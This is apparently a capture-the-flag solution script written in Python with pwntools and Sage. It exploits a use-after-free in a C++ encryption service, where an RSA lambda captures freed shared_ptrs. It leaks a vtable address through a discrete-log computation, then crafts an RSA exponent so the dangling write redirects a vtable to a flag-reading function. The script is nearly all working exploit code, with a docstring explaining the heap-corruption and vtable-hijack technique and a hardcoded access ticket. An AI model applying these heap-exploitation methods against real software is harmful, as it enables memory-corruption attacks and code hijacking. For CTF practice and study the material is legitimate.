from pwn import *

from sage.all import *
import sys

""" 
Program is an encryption/decryption service. There are four encryption algorithms you can use. 

Cipher is an pure abstract base class. There are four (technically five) derived classes.
1. Missouri Encryption Standard (MES): b64 encode/decode
2. Algorithm MCCCXXXVII: Caesar's Cipher
    3. Algorithm 13: ROT14 (derived from Algorithm MCCCXXXVII)
4. Algorithm X: RSA
5. Flag One Time Pad - a hidden class that was never called but contains encrypt function that reads in the flag. 

All of the challenges rely on a BigInt class. 

In the RSA, e, p, and q are passed to the createKey() method as a shared_ptr<BigInt> each

The RSA class contains a function pointer member variable, totient_. 
Within createKey(), even though Euler's totient Φ is used to compute d, p and q are passed to a lambda 
which creates a closure that takes in e and recomputes d with Carmichael's totient (λ). The resulting d 
is stored in *p and returned. This lamda is assigned to totient_. 

Bug: p and q are passed by reference to the lambda and their ref pointers are not incremented. 
When p and q go out of scope in main, their heap pointers are freed even though references to the p and q
shared_ptr stack objects remains. As long as those don't get clobbered, the heap pointers will remain
and the chunks pointed to will be popped off the tcache freed list when new chunks are allocated. totient_ 
is called if you use the same key to decrypt 10 times. 

Exploit:

1. Allocate RSA obj
2. Allocate MES obj -> p
    This is the same size as a BigInt obj, has VTable pointer at top, followed by a b64 symbol lookup char[]
    and followed by a very helpful value of 0x16 which wil be interpreted by BigInt as the number of digits
3. Allocate a ROT14 obj -> BigInt(14) -> q
    ROT14 chunk is smaller than BigInt but contains a BigInt object of value 14, which goes in q. 
4. Decrypt 10 times, which allows you to call totient_ function:
    p = 0x48474645444342410000<address of vtable> 
    q = 0xd
    d = e ^ (-1) mod λ(p - 1, q - 1)
    d is returned
5. Find discrete log of ciphertext mod n, recovering d which allows you to recover λ, and thus the address in p.
6. Use MES vtable address to find address of FlagOTP VTable 
    and find a new e such that e is the modular inverse of the latter address mod lambda, 
    then find a new p and q that work with new e to get past RSA checks
7. Re-trigger the bug, writing the new address into p
8. Call encrypt on MES object with the overwritten VTable, calling the functiont that reads from flag file and XORs with your message

"""

count = 0

while(1):
    count += 1

    if not int(sys.argv[1]):
        r = process(["release/cryptochall"])
    else:
        r = remote("crypto-challenge-lpw5gjiu6sqxi.shellweplayaga.me", 31337)
        r.readuntil(b":")
        r.sendline(b"ticket{ForecastleLeeward5167n22:AQPVXpMT0f0T1TfD3ZBUINBETqDDIeYe1xMnThHFyRmPRIKM}")
        r.readuntil(b"Welcome")
    
    def send_input(input):
        r.readuntil(b"> ")
        r.sendline(input)
        return 0

    def send_number(input):
        r.readuntil(b"> ")
        r.sendline(str(input).encode())
        return 0

    def create_key(kind, keys=[]):
        send_number(0)
        send_number(kind)

        if len(keys) > 0:
            for k in keys:
                send_input(k)
        return 0

    def encrypt(cipher, plaintext):
        send_number(1)
        send_number(cipher)
        send_input(plaintext)
        r.readuntil(b":\n\n")
        x = r.readuntil(b"\n\n")[:-2].split(b"\n")[0]
        return int(x[2:].decode(),16)

    def decrypt(cipher, ciphertexts):
        send_number(2)
        send_number(cipher)
        send_number(len(ciphertexts))
        for c in ciphertexts:
            send_input(c)
        r.readuntil(b":\n\n")
        return r.readline()[:-1]

    def decrypt10(cipher, ciphertexts):
        send_number(2)
        send_number(cipher)
        send_number(len(ciphertexts))
        for c in ciphertexts:
            send_input(c)
        send_input(b'y')
        r.readlines(4)
        m = int.from_bytes(r.readline()[:-1], byteorder='big')
        return m

    def trigger(e, p, q, num):
        xe = hex(e).encode()
        xp = hex(p).encode()
        xq = hex(q).encode()
        create_key(3, [xe, xp, xq])
        create_key(0)
        create_key(1)
        for i in range(9):
            decrypt(num, [b"0x1"]) 
        return decrypt10(num,[b"0x2"])

    p1 = 0x87a0acc71a5f08bc26412b3f
    q1 = 0x271cc445d27091437f9143c9
    e1 = 0x10001
    n1 = p1 * q1
    phi1 = (p1-1) * (q1-1)
    d1 = power_mod(e1, -1, phi1)
    
    print("\nRSA Object 1 Configuration:")
    print("e1 =", hex(e1))
    print("p1 =", hex(p1))
    print("q1 =", hex(q1))
    print("d1 =", hex(d1))
    print("n1 =", hex(n1))


    print("\nTriggering bug with ciphertext: 0x2...")
    m1 = trigger(e1, p1, q1, 0)

    print("2^(d) mod n1 =", hex(m1))

    print("\nTrying to compute discrete log base 2 to find d...")
    A = Zmod(n1)
    x = A(m1)
    try:
        d = log(x, 2) 

    except:
        print("\nAttempt to find d failed. Starting all over...")
        r.close()
        continue

    print("d:", hex(d))
    print("\nReversing VTable Address...")

    lambda_times_k = (e1 * d) - 1
    q_minus_1 = 13
    p_minus_1_times_k = lambda_times_k//q_minus_1

    upper_bits = 0x48474645444342410000000000000000
    k = p_minus_1_times_k//upper_bits
    p_minus_1 = p_minus_1_times_k//k
    address = p_minus_1 - upper_bits + 1 
    offset = 0x28
    new_vtbl_addr = address + offset
    lambd = p_minus_1*q_minus_1

    # e * d = 1 mod λ -> k * λ = e * d for some k.
    # gcd(p - 1, q - 1) more than likely just returns 1
    print("e1 * d - 1 = k * λ = ((p-1) * (q-1)) / 1) * k = (p-1) * (14-1) * k = ", hex(lambda_times_k))
    # q is the 'encrypt key' member variable of ROT14 which is a BigInt object of value 14, so q-1 is: " + hex(q_minus_1) + ".\nDivide that out of k * λ")
    print("(p - 1) * k = ", hex(p_minus_1_times_k))
    # Upper bits of corrupted p is begginning of b64 lookup table: 0x48474645444342410000000000000000
    # Allows us to guess k
    print("p - 1 = ((p - 1) * k) / k = ", hex(p_minus_1))
    print("\nb64 VTable Address:", hex(address))
    # Offset to FlagOneTimePad VTable is 0x28 bytes.
    print("OTP VTable Address:", hex(new_vtbl_addr))
    # Create a new RSA object such that triggering the bug writes overwrites the MES b64 VTable address at the top of p with the address of the OTP VTable Address.
    # If triggered the same way, corrupted p and q and thus λ will remain the same for a new RSA object, so need to find different e -> e2.
    # Inside C++ lambda, e2 will be used to compute d which is stored at the top of p where the VTable pointer is for the MES b64 class.
    # Find an e2 such that:

    print("e2^(-1) mod λ = " + hex(new_vtbl_addr))

    if (int(new_vtbl_addr) % 2 == 1):
        print("Bad address (odd), starting all over...")
        r.close()
        continue
    
    if (gcd(new_vtbl_addr, lambd) != 1): 
        print("OTP VTable Address not coprime with λ, starting all over...")
        r.close()
        continue

    # e2 = (FlagOTP VTable Address)^(-1) mod "λ
    e2 = int(power_mod(new_vtbl_addr, -1, lambd))
    print("e2 =", hex(e2))

    if (e2 % 2 == 0):
        print("\nNew e isn't odd, starting all over...")
        r.close()
        continue
    
    print("\nFinding a new p and q...")
    p2 = 0
    q2 = 0 
    phi2 = 0
    i = 0
    while(1):
        i += 1
        p2 = random_prime(2**128)
        q2 = random_prime(2**128)
        phi2 = (p2-1) * (q2 - 1)
        if gcd(e2, phi2) != 1:
            continue
            if i == 10:
                break
        d2 = power_mod(e2, -1, phi2)
        n2 = p2 * q2
        break
    
    if (i == 10):
        print("\nFailed to find workable p and q, starting all over...")
        continue
    
    print("\nRSA Object 2 Configuration:")
    print("e2 =", hex(e2))
    print("p2 =", hex(p2))
    print("q2 =", hex(q2))
    print("d2 =", hex(d2))
    print("n2 =", hex(n2))

    print("\nTriggering bug again...")
    trigger(e2, p2, q2, 3)

    mask = b'\xff' * 64
    print("\nCalling encrypt() on b64 object with overwritten VTable...")
    ct = encrypt(4,mask)

    mask = int.from_bytes(mask, byteorder='big')
    ct = mask ^ ct
    print(ct)
    ct = bytes.fromhex(hex(ct)[2:])
    ct = ct.decode("ASCII")
    print("\nFlag:", ct)
    print("\nRun Count:", count)
    break




